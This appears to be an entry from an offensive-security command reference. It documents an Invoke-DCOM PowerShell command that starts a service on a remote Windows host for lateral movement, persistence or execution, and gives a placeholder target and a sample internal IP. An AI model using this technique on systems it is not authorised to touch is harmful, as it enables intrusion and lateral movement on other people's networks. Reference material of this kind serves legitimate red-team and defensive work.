---
type: command
executor: powershell
data: Invoke-DCOM -ComputerName TARGET_HOST -Method ServiceStart "MyService"
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - lateral-movement
  - dcom
verified: true
validated: true
---

# Invoke DCOM Start Service

## Command

```powershell
Invoke-DCOM -ComputerName TARGET_HOST -Method ServiceStart "MyService"
```

## Description

Starts a remote service named MyService via DCOM for persistence or execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -ComputerName TARGET_HOST | Target host | Yes |
| -Method ServiceStart | Service method | Yes |
| "MyService" | Service name | Yes |

## Examples

### Basic

```powershell
Invoke-DCOM -ComputerName 192.168.1.100 -Method ServiceStart "CustomService"
```

## Expected Output

Success confirmation; service starts on target.

## Related

- [[procedures/dcom-lateral-movement]]
- [[tools/Invoke-DCOM]]
